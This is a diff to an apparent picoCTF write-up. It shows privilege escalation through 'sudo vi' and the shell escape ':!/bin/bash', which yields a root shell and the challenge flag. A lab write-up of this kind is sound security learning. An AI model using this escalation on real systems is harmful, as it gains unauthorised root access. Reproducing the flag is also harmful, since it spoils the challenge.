@@ -70,11 +70,12 @@ drwx------ 2 picoplayer picoplayer   34 Oct 11 04:57 .cache
 -rw------- 1 picoplayer picoplayer 3663 Oct 11 05:02 .viminfo
 
 - I used GTFOBins script to escalate my priviledge
-- 
+- I opened a new file and clicked esc and wrote :!/bin/bash
 picoplayer@challenge:~$ sudo vi test
 :!/bin/bash
 root@challenge:/home/picoplayer# whoami
 root
+- Now that we got the root access we can read the flag.
 root@challenge:/home/picoplayer# cd ../../root
 root@challenge:~# ls -la
 total 12
@@ -85,4 +86,3 @@ drwxr-xr-x 1 root root   51 Oct 11 04:56 ..
 -rw-r--r-- 1 root root  161 Dec  5  2019 .profile
 root@challenge:~# cat .flag.txt 
 picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4}
-root@challenge:~# 
